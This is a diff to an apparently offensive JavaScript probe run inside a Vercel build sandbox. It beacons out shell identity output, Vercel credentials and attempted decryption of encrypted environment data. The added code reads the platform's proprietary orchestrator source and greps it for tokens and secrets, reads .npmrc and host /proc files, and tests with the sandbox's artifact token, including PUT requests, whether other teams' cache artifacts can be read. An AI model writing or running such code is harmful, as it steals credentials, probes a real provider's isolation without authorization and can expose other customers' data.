@@ -133,7 +133,7 @@ function tryDecrypt(keyStr, contentStr) {
 // EARLY BEACON — sent immediately before any network probes.
 // Critical env/crypto data arrives even if the main probe times out.
 sendBeacon({
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v18-early",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v19-early",
   whoami: safe(() => execSync("id; uname -a").toString().trim()),
   tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
   vercelCreds: {
@@ -148,7 +148,7 @@ sendBeacon({
 });
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v18",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v19",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -909,6 +909,149 @@ const report = {
       v1Fluid: probe('/api/v1/fluid'),
       v1FluidRuns: probe('/api/v1/fluid/runs'),
     };
+  }),
+
+  // Container capability audit — what Linux capabilities does the process have?
+  // Even as root, Firecracker may drop dangerous caps like CAP_SYS_ADMIN.
+  // Full CapEff=0000003fffffffff means ALL capabilities — that's full root on the bare metal.
+  containerCaps: safe(() => {
+    const status = safe(() => readFileSync('/proc/self/status', 'utf8'));
+    const caps = {};
+    if (typeof status === 'string') {
+      ['CapInh','CapPrm','CapEff','CapBnd','CapAmb'].forEach(f => {
+        const m = status.match(new RegExp(`^${f}:\\s+(\\S+)`, 'm'));
+        if (m) caps[f] = m[1];
+      });
+      // NSpid reveals if we're in a user namespace (e.g., NSpid: 56\t1 means we're PID 1 inside our namespace)
+      const ns = status.match(/^NSpid:\s+(.+)/m);
+      if (ns) caps.NSpid = ns[1].trim();
+    }
+    // Check /proc/1/cmdline — if PID 1 is NOT /sbin/init, we're in our own PID namespace
+    caps.pid1Cmd = safe(() => readFileSync('/proc/1/cmdline', 'utf8').replace(/\x00/g, ' ').trim().slice(0, 100));
+    // Seccomp filter status (SECCOMP: 0=disabled, 1=strict, 2=filter)
+    const seccomp = typeof status === 'string' ? (status.match(/^Seccomp:\s+(\d+)/m)||[])[1] : null;
+    caps.seccomp = seccomp;
+    // AppArmor/LSM profile
+    caps.lsmProfile = safe(() => readFileSync('/proc/self/attr/current', 'utf8').trim());
+    // Can we mount filesystems? (cap_sys_admin)
+    caps.mountTest = safe(() => {
+      execSync('mount --bind /tmp /tmp 2>/dev/null || true');
+      return 'mount-succeeded';
+    });
+    // Can we create raw sockets? (cap_net_raw)
+    caps.netNsInfo = safe(() => readFileSync('/proc/self/net/dev', 'utf8').split('\n').slice(0,5).join('\n'));
+    return caps;
+  }),
+
+  // Cross-tenant artifact read test — can VERCEL_ARTIFACTS_TOKEN authenticate against OTHER team's cache?
+  // Attack: if server only validates token signature but not teamId claim vs URL teamId param,
+  //         attacker could read/overwrite artifacts of OTHER Vercel teams.
+  crossTenantArtifact: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    if (!tok) return 'no-artifacts-token';
+    const ownerId = process.env.VERCEL_ARTIFACTS_OWNER || '';
+    // Decode our own teamId from JWT claims
+    let jwtOwnerId = '';
+    try {
+      const parts = tok.split('.');
+      const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+      jwtOwnerId = claims?.data?.ownerId || claims?.teamId || '';
+    } catch(_) {}
+    const knownHash = 'beefdeadbeefdeadbeefdeadbeefdeadbeef1337'; // we PUT this in v18
+    const apiBase = 'https://vercel.com/api/v8/artifacts';
+    const probe = (label, url) => {
+      const st = safe(() => execSync(
+        `curl -s --max-time 8 -o /tmp/ct_${label} -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${url}' 2>/dev/null || true`
+      ).toString().trim());
+      const bd = safe(() => readFileSync(`/tmp/ct_${label}`, 'utf8').slice(0, 300));
+      return { status: st, body: bd };
+    };
+    return {
+      jwtOwnerId,
+      ownerId,
+      // Test 1: GET our known artifact with correct teamId (baseline — should be 200 or 404)
+      getOwnTeam: probe('own', `${apiBase}/${knownHash}?teamId=${ownerId}`),
+      // Test 2: GET our known artifact with NO teamId (token only — does server enforce claim?)
+      getNoTeamId: probe('notm', `${apiBase}/${knownHash}`),
+      // Test 3: GET our artifact with FAKE teamId (another team's format)
+      getFakeTeamId: probe('fake', `${apiBase}/${knownHash}?teamId=team_AAAAAAAAAAAAAAAAAAAAAAAA`),
+      // Test 4: QUERY (POST) with fake teamId — does QUERY work for arbitrary teams?
+      queryFakeTeam: safe(() => {
+        const body = JSON.stringify({ hashes: [knownHash] });
+        safe(() => writeFileSync('/tmp/ct_qbody.json', body));
+        const st = execSync(
+          `curl -s --max-time 8 -o /tmp/ct_qfake -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' --data @/tmp/ct_qbody.json '${apiBase}?teamId=team_AAAAAAAAAAAAAAAAAAAAAAAA' 2>/dev/null || true`
+        ).toString().trim();
+        return { status: st, body: readFileSync('/tmp/ct_qfake', 'utf8').slice(0, 300) };
+      }),
+      // Test 5: PUT to our team, then GET with another fake teamId — does data cross tenants?
+      putOwnThenGetFake: safe(() => {
+        const newHash = 'cafecafecafecafecafecafecafecafecafecafe';
+        // PUT to our team
+        const putSt = execSync(
+          `curl -s --max-time 8 -o /tmp/ct_put2 -w '%{http_code}' -X PUT -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/octet-stream' -H 'x-artifact-client-ci: vercel' -H 'x-artifact-duration: 100' -d 'cross-tenant-probe-v19' '${apiBase}/${newHash}?teamId=${ownerId}' 2>/dev/null || true`
+        ).toString().trim();
+        // GET from fake team
+        const getFakeSt = execSync(
+          `curl -s --max-time 8 -o /tmp/ct_getfake2 -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/${newHash}?teamId=team_AAAAAAAAAAAAAAAAAAAAAAAA' 2>/dev/null || true`
+        ).toString().trim();
+        return {
+          putStatus: putSt,
+          getFakeStatus: getFakeSt,
+          getFakeBody: readFileSync('/tmp/ct_getfake2', 'utf8').slice(0, 200),
+        };
+      }),
+    };
+  }),
+
+  // Process and namespace isolation — understand Firecracker/VM boundary
+  procIsolation: safe(() => ({
+    // /proc/mounts reveals filesystem stack: overlayfs, tmpfs, squashfs layers
+    mounts: safe(() => readFileSync('/proc/mounts', 'utf8').split('\n').slice(0, 25).join('\n')),
+    // cgroup hierarchy reveals container/VM resource partitioning
+    cgroup: safe(() => readFileSync('/proc/self/cgroup', 'utf8').slice(0, 500)),
+    // /proc/1/net/dev — if we share network namespace with PID 1, same netdev list
+    pid1NetDev: safe(() => readFileSync('/proc/1/net/dev', 'utf8').split('\n').slice(0,8).join('\n')),
+    // /proc/sys/kernel/hostname — VM hostname (reveals instance naming convention)
+    hostname: safe(() => execSync('hostname 2>/dev/null || cat /proc/sys/kernel/hostname || true').toString().trim()),
+    // /proc/uptime — reveals how long the VM/container has been running (prewarming evidence)
+    uptime: safe(() => readFileSync('/proc/uptime', 'utf8').trim()),
+    // /proc/sys/kernel/osrelease — kernel version (Firecracker uses patched kernels)
+    kernel: safe(() => readFileSync('/proc/sys/kernel/osrelease', 'utf8').trim()),
+    // Check if /proc/kcore is accessible — would indicate host kernel access
+    kcore: safe(() => { const s = existsSync('/proc/kcore'); return `exists=${s},size=${s ? execSync('ls -la /proc/kcore 2>/dev/null').toString().trim().split(/\s+/)[4] : 'N/A'}`; }),
+    // /proc/1/maps — if PID 1 is Vercel orchestrator, reveals its memory layout
+    pid1MapsPreview: safe(() => readFileSync('/proc/1/maps', 'utf8').split('\n').slice(0,5).join('\n')),
+    // Number of CPUs allocated to this VM
+    cpuCount: safe(() => execSync('nproc 2>/dev/null || cat /proc/cpuinfo | grep processor | wc -l || true').toString().trim()),
+    // Total memory allocated
+    memTotal: safe(() => execSync("grep MemTotal /proc/meminfo 2>/dev/null || true").toString().trim()),
+  })),
+
+  // Orchestrator source snippet — /var/task/index.js is Vercel's proprietary build orchestrator (9MB).
+  // Reading first 5KB reveals API endpoint patterns, internal auth, and build process logic.
+  orchestratorSource: safe(() => ({
+    indexJsHead: safe(() => readFileSync('/var/task/index.js', 'utf8').slice(0, 5000)),
+    initJsHead: safe(() => readFileSync('/var/task/init.js', 'utf8').slice(0, 2000)),
+    devDeps: safe(() => readFileSync('/var/task/dev-dependencies.json', 'utf8').slice(0, 1000)),
+    // Search for credential patterns, endpoints, and API tokens in the orchestrator
+    credSearch: safe(() => execSync("grep -a -m 5 -E 'Authorization|Bearer|token|secret|api.vercel|api-iad1' /var/task/index.js 2>/dev/null | head -10 || true").toString().trim().slice(0, 500)),
+    // Check the npmrc (may contain auth tokens for internal npm registry)
+    npmrc: safe(() => readFileSync('/var/task/.npmrc', 'utf8').trim()),
+  })),
+
+  // Internal DNS resolution — spawn child node process to use dns module synchronously
+  internalDns: safe(() => {
+    const hosts = ['api-iad1.vercel.com','suspense-cache.vercel.com','oidc.vercel.com','vercel.com','169.254.169.254'];
+    const results = {};
+    for (const h of hosts) {
+      results[h] = safe(() => execSync(
+        `node -e "require('dns').lookup('${h}',(e,a)=>{process.stdout.write(a||'ERR:'+e.code);process.exit()})" 2>/dev/null || true`
+      ).toString().trim());
+    }
+    // Also try getent (available on al2023)
+    results.getentApiIad1 = safe(() => execSync('getent hosts api-iad1.vercel.com 2>/dev/null || true').toString().trim());
+    return results;
   }),
 };
 
